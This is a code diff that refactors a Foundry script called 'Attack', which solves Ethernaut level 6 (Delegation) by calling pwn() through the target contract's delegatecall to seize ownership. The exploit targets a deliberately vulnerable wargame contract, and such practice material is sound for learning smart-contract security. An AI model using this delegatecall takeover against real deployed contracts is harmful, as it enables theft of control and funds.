@@ -8,7 +8,6 @@ import { Delegation } from "src/Level06.sol";
 
 contract Attack is Script {
     Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
-    Delegation instance;
 
     function run() public {
         uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
@@ -18,7 +17,7 @@ contract Attack is Script {
         Vm.Log[] memory entries = vm.getRecordedLogs();
         address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
         console2.log(instanceAddress);
-        instance = Delegation(instanceAddress);
+        Delegation instance = Delegation(instanceAddress);
 
         (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
         require(success, "Attack failed");
